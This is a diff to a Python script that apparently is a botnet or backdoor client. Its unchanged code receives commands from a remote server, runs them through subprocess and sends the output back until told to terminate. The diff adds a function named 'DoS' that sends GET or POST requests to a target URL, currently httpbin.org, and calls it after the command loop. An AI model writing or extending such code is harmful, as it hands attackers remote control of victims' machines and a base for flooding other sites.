@@ -2,6 +2,8 @@ import socket
 import os
 import subprocess
 import shlex
+import requests
+
 
 def execute(cmd):
     # Removing whitespace from both the sides
@@ -30,6 +32,13 @@ def execute(cmd):
         #output = subprocess.getoutput(cmd)
         print(output)
         return output
+
+def DoS(headers="",url="http://httpbin.org/post",option='p'):
+    if option == 'p':
+        r = requests.post(url,headers=headers)
+    elif option == 'g':
+        r = requests.get(url,headers=headers)
+    print(r.text)
 
 def Handshake(socket):
     if os.path.exists("myInfo"):
@@ -61,6 +70,7 @@ def main():
     response = ''
     ack = Handshake(server)
     if ack == 'ACK':
+        #Wait until command is sent
         while response != 'terminate':
             response = server.recv(4096)
             print("Hello")
@@ -68,6 +78,7 @@ def main():
             if response:
                 #print(execute(response.decode()))
                 server.send(bytes(execute(response.decode()),'utf-8'))
+    DoS(option='g',url='http://httpbin.org/get')
     x = input(":")
 
 if __name__ == '__main__':
